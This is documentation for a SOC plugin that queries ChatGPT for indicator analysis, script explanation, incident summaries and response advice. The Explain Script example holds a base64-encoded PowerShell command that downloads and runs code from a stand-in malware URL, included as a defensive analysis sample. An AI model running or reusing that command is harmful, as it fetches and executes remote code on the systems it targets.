# Description

Interact with OpenAI ChatGPT models to assist SOC analysts with threat analysis, incident summarization, script explanation, and response recommendations

# Key Features

* Send prompts to ChatGPT and receive AI-generated responses
* Analyze indicators of compromise with AI-powered threat context
* Summarize security incidents into concise executive briefings
* Get AI-recommended response actions for security incidents
* Explain suspicious scripts and commands with security context

# Requirements

* OpenAI API key with access to Chat Completions API
* Sufficient API credits/quota for the selected model

# Supported Product Versions

* gpt-4o
* gpt-4o-mini
* gpt-4-turbo
* gpt-3.5-turbo

# Documentation

## Setup

The connection configuration accepts the following parameters:  

|Name|Type|Default|Required|Description|Enum|Example|Placeholder|Tooltip|
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
|api_key|credential_secret_key|None|True|OpenAI API key for authenticating to the ChatGPT API|None|{"secretKey": "sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234"}|None|None|
|model|string|gpt-4o|True|Default ChatGPT model to use for completions|["gpt-4o", "gpt-4o-mini", "gpt-4-turbo", "gpt-3.5-turbo"]|gpt-4o|None|None|

Example input:

```
{
  "api_key": {
    "secretKey": "sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234"
  },
  "model": "gpt-4o"
}
```

## Technical Details

### Actions


#### Analyze Indicator

This action is used to submit an indicator of compromise (IP, domain, hash, or URL) to ChatGPT for threat context 
analysis

##### Input

|Name|Type|Default|Required|Description|Enum|Example|Placeholder|Tooltip|
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
|additional_context|string|None|False|Optional additional context about where this indicator was observed|None|Observed in outbound DNS traffic from a compromised workstation|Describe where the indicator was found|None|
|indicator|string|None|True|The indicator of compromise to analyze (IP address, domain, file hash, or URL)|None|198.51.100.23|Enter an IOC (IP, domain, hash, or URL)|None|
|indicator_type|string|None|True|The type of indicator being submitted|["ip_address", "domain", "file_hash", "url"]|ip_address|None|None|
  
Example input:

```
{
  "additional_context": "Observed in outbound DNS traffic from a compromised workstation",
  "indicator": "198.51.100.23",
  "indicator_type": "ip_address"
}
```

##### Output

|Name|Type|Required|Description|Example|
| :--- | :--- | :--- | :--- | :--- |
|analysis|string|True|AI-generated threat analysis of the indicator|The IP address 198.51.100.23 is associated with known command-and-control infrastructure. Recommended actions: block at firewall, investigate endpoints that communicated with this IP|
|recommended_actions|[]string|True|List of recommended response actions based on the analysis|["Block IP at perimeter firewall", "Search SIEM for historical connections to this IP", "Isolate any endpoints that have communicated with this IP"]|
|risk_assessment|string|True|Brief risk level assessment based on the analysis|HIGH - Associated with known C2 infrastructure|
  
Example output:

```
{
  "analysis": "The IP address 198.51.100.23 is associated with known command-and-control infrastructure. Recommended actions: block at firewall, investigate endpoints that communicated with this IP",
  "recommended_actions": [
    "Block IP at perimeter firewall",
    "Search SIEM for historical connections to this IP",
    "Isolate any endpoints that have communicated with this IP"
  ],
  "risk_assessment": "HIGH - Associated with known C2 infrastructure"
}
```

#### Ask ChatGPT

This action is used to send a prompt to ChatGPT and receive a response

##### Input

|Name|Type|Default|Required|Description|Enum|Example|Placeholder|Tooltip|
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
|max_tokens|integer|2048|False|Maximum number of tokens in the response (higher values allow longer responses)|None|2048|None|None|
|prompt|string|None|True|The prompt or question to send to ChatGPT|None|What are the common indicators of a phishing email?|Enter your prompt|None|
|system_message|string|None|False|Optional system message to set the behavior and context for the AI assistant|None|You are a cybersecurity analyst assistant|Enter system instructions|None|
|temperature|float|0.7|False|Controls randomness in the response (0.0 = deterministic, 2.0 = most random)|None|0.7|None|None|
  
Example input:

```
{
  "max_tokens": 2048,
  "prompt": "What are the common indicators of a phishing email?",
  "system_message": "You are a cybersecurity analyst assistant",
  "temperature": 0.7
}
```

##### Output

|Name|Type|Required|Description|Example|
| :--- | :--- | :--- | :--- | :--- |
|response|string|True|The text response from ChatGPT|Common indicators of a phishing email include suspicious sender addresses, urgent language, unexpected attachments, and mismatched URLs|
|usage|object|True|Token usage details for the request|{"prompt_tokens": 25, "completion_tokens": 150, "total_tokens": 175}|
  
Example output:

```
{
  "response": "Common indicators of a phishing email include suspicious sender addresses, urgent language, unexpected attachments, and mismatched URLs",
  "usage": {
    "completion_tokens": 150,
    "prompt_tokens": 25,
    "total_tokens": 175
  }
}
```

#### Explain Script

This action is used to submit a suspicious script or command for AI-powered explanation with security context

##### Input

|Name|Type|Default|Required|Description|Enum|Example|Placeholder|Tooltip|
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
|context|string|None|False|Optional context about where the script was found (e.g., email attachment, scheduled task, registry)|None|Found in a scheduled task on a compromised endpoint|Describe where the script was found|None|
|script|string|None|True|The script content or command to analyze and explain|None|powershell -enc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlACcAKQApAA==|Paste the script or command|None|
|script_type|string|None|False|The type or language of the script|["powershell", "bash", "python", "batch", "vbscript", "javascript", "unknown"]|powershell|None|None|
  
Example input:

```
{
  "context": "Found in a scheduled task on a compromised endpoint",
  "script": "powershell -enc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlACcAKQApAA==",
  "script_type": "powershell"
}
```

##### Output

|Name|Type|Required|Description|Example|
| :--- | :--- | :--- | :--- | :--- |
|explanation|string|True|Human-readable explanation of what the script does|This PowerShell command decodes and executes a base64-encoded script that downloads and runs content from http://example.com/malware using the .NET WebClient class|
|indicators|[]string|True|Any IOCs extracted from the script (URLs, IPs, domains, hashes)|["http://example.com/malware"]|
|risk_level|string|True|Assessment of the script's risk level|CRITICAL - Downloads and executes remote code|
|techniques|[]string|True|MITRE ATT&CK techniques or attack patterns identified in the script|["T1059.001 - PowerShell", "T1027 - Obfuscated Files or Information", "T1105 - Ingress Tool Transfer"]|
  
Example output:

```
{
  "explanation": "This PowerShell command decodes and executes a base64-encoded script that downloads and runs content from http://example.com/malware using the .NET WebClient class",
  "indicators": [
    "http://example.com/malware"
  ],
  "risk_level": "CRITICAL - Downloads and executes remote code",
  "techniques": [
    "T1059.001 - PowerShell",
    "T1027 - Obfuscated Files or Information",
    "T1105 - Ingress Tool Transfer"
  ]
}
```

#### Suggest Response Actions

This action is used to get AI-recommended response and containment actions for a security incident

##### Input

|Name|Type|Default|Required|Description|Enum|Example|Placeholder|Tooltip|
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
|environment_context|string|None|False|Optional context about the environment (network segmentation, critical assets, existing controls)|None|Windows domain environment with 500 endpoints. Critical assets include SQL database servers in isolated VLAN.|Describe the environment|None|
|incident_description|string|None|True|Description of the security incident requiring response recommendations|None|Ransomware detected encrypting files on three workstations. Lateral movement observed via SMB. Ransom note referencing LockBit found on desktops.|Describe the security incident|None|
|response_phase|string|containment|False|Current phase of incident response to tailor recommendations|["identification", "containment", "eradication", "recovery", "lessons_learned"]|containment|None|None|
  
Example input:

```
{
  "environment_context": "Windows domain environment with 500 endpoints. Critical assets include SQL database servers in isolated VLAN.",
  "incident_description": "Ransomware detected encrypting files on three workstations. Lateral movement observed via SMB. Ransom note referencing LockBit found on desktops.",
  "response_phase": "containment"
}
```

##### Output

|Name|Type|Required|Description|Example|
| :--- | :--- | :--- | :--- | :--- |
|immediate_actions|[]string|True|Prioritized list of immediate actions to take|["Isolate affected workstations from the network immediately", "Block SMB lateral movement via host-based firewall rules", "Disable compromised user accounts"]|
|investigation_steps|[]string|True|Recommended investigation steps to determine scope and impact|["Identify patient zero and initial infection vector", "Search for LockBit IOCs across all endpoints", "Review authentication logs for compromised credentials"]|
|long_term_recommendations|[]string|True|Strategic recommendations to prevent recurrence|["Implement network segmentation between workstation and server VLANs", "Deploy EDR with ransomware-specific detection rules", "Conduct phishing awareness training"]|
  
Example output:

```
{
  "immediate_actions": [
    "Isolate affected workstations from the network immediately",
    "Block SMB lateral movement via host-based firewall rules",
    "Disable compromised user accounts"
  ],
  "investigation_steps": [
    "Identify patient zero and initial infection vector",
    "Search for LockBit IOCs across all endpoints",
    "Review authentication logs for compromised credentials"
  ],
  "long_term_recommendations": [
    "Implement network segmentation between workstation and server VLANs",
    "Deploy EDR with ransomware-specific detection rules",
    "Conduct phishing awareness training"
  ]
}
```

#### Summarize Incident

This action is used to generate a concise executive summary of a security incident from provided alert data or notes

##### Input

|Name|Type|Default|Required|Description|Enum|Example|Placeholder|Tooltip|
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
|audience|string|technical|False|Target audience for the summary to adjust technical depth|["executive", "technical", "both"]|technical|None|None|
|incident_data|string|None|True|Raw incident data, alert details, or analyst notes to summarize|None|Alert: Malware detected on WORKSTATION-045. Hash: abc123def456. User: jsmith. Multiple C2 callbacks observed to 198.51.100.23:443. Lateral movement attempted to FILE-SERVER-02.|Paste incident data, alerts, or notes|None|
|severity|string|None|False|Severity level of the incident for context|["critical", "high", "medium", "low", "informational"]|high|None|None|
  
Example input:

```
{
  "audience": "technical",
  "incident_data": "Alert: Malware detected on WORKSTATION-045. Hash: abc123def456. User: jsmith. Multiple C2 callbacks observed to 198.51.100.23:443. Lateral movement attempted to FILE-SERVER-02.",
  "severity": "high"
}
```

##### Output

|Name|Type|Required|Description|Example|
| :--- | :--- | :--- | :--- | :--- |
|key_findings|[]string|True|List of key findings extracted from the incident data|["Active C2 communication to 198.51.100.23", "Lateral movement attempted to FILE-SERVER-02", "User account jsmith potentially compromised"]|
|summary|string|True|Concise incident summary tailored to the specified audience|INCIDENT SUMMARY: Malware infection detected on WORKSTATION-045 with active C2 communications and lateral movement attempts. Immediate containment recommended.|
|timeline|string|True|Extracted timeline of events if identifiable from the data|1. Malware executed on WORKSTATION-045. 2. C2 callback established to 198.51.100.23:443. 3. Lateral movement attempted to FILE-SERVER-02.|
  
Example output:

```
{
  "key_findings": [
    "Active C2 communication to 198.51.100.23",
    "Lateral movement attempted to FILE-SERVER-02",
    "User account jsmith potentially compromised"
  ],
  "summary": "INCIDENT SUMMARY: Malware infection detected on WORKSTATION-045 with active C2 communications and lateral movement attempts. Immediate containment recommended.",
  "timeline": "1. Malware executed on WORKSTATION-045. 2. C2 callback established to 198.51.100.23:443. 3. Lateral movement attempted to FILE-SERVER-02."
}
```
### Triggers
  
*This plugin does not contain any triggers.*
### Tasks
  
*This plugin does not contain any tasks.*

### Custom Types
  
*This plugin does not contain any custom output types.*

## Troubleshooting
  
*This plugin does not contain a troubleshooting.*

# Version History

* 1.0.0 - Initial plugin release with Ask ChatGPT, Analyze Indicator, Summarize Incident, Suggest Response Actions, and Explain Script actions

# Links

* [OpenAI](https://openai.com)
* [OpenAI API Reference](https://platform.openai.com/docs/api-reference)

## References

* [OpenAI Chat Completions API](https://platform.openai.com/docs/guides/chat-completions)